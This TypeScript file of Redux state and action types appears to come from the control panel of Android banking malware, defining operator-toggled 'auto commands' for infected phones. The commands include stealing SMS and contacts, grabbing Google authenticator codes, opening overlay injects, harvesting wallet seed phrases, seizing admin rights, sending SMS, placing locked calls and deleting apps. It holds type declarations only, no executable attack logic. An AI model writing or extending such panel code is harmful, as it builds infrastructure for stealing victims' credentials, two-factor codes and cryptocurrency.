export const AC_CHANGE_ENABLED = "AC_CHANGE_ENABLED";
export const AC_CHANGE_COMMAND_FIELDS = "AC_CHANGE_COMMAND_FIELDS";

export type allowedCommands = "getAccounts" | "getInstalledApps" | "updateInjectList" |
    "getSMSList" | "getContactsList" | "getAdminRights" | "googleAuthGrabber" |
    "calling" | "openInject" | "sendPush" | "sendSMS" | "getSeedPhrase" |
    "clearAppData" | "runApp" | "deleteApp" | "openUrl";

export interface Toggleable {
    enabled: boolean,
}

interface ToggleableWithApplication extends Toggleable {
    application?: string,
    url?: string,
}

export type GetAccountsState = Toggleable;
export type GetInstalledAppsState = Toggleable;
export type UpdateInjectListState = Toggleable;
export type GetSMSListState = Toggleable;
export type GetContactsListState = Toggleable;
export type GetAdminRightsState = Toggleable;
export type GoogleAuthGrabberState = Toggleable;
export type ClearAppDataState = ToggleableWithApplication;
export type RunAppState = ToggleableWithApplication;
export type DeleteAppState = ToggleableWithApplication;
export type OpenUrlState = ToggleableWithApplication;
export type OpenInjectState = ToggleableWithApplication;

export interface CallingState extends Toggleable {
    number: string,
    locked: boolean,
}


export interface SendPushState extends ToggleableWithApplication {
    title: string,
    text: string,
}

export interface SendSMSState extends Toggleable {
    number: string,
    message: string,
}

export interface GetSeedPhraseState extends Toggleable {
    wallets: string[],
}

export interface AutoCommandsState {
    getAccounts: GetAccountsState,
    getInstalledApps: GetInstalledAppsState,
    updateInjectList: UpdateInjectListState,
    getSMSList: GetSMSListState,
    getContactsList: GetContactsListState,
    getAdminRights: GetAdminRightsState,
    googleAuthGrabber: GoogleAuthGrabberState,
    calling: CallingState,
    openInject: OpenInjectState,
    sendPush: SendPushState,
    sendSMS: SendSMSState,
    getSeedPhrase: GetSeedPhraseState,
    clearAppData: ClearAppDataState,
    runApp: RunAppState,
    deleteApp: DeleteAppState,
    openUrl: OpenUrlState,
    isLoaded: boolean,
}

export interface ACChangeEnabledPayload extends Toggleable {
    command: allowedCommands,
}

export interface ACChangeEnabledAction {
    type: typeof AC_CHANGE_ENABLED,
    payload: ACChangeEnabledPayload,
}

export type ACChangeCommandFieldsPayload = Omit<AutoCommandsState, "isLoaded">;

export interface ACChangeCommandFieldsAction {
    type: typeof AC_CHANGE_COMMAND_FIELDS,
    payload: ACChangeCommandFieldsPayload,
}

export type ACActionTypes = ACChangeEnabledAction | ACChangeCommandFieldsAction;
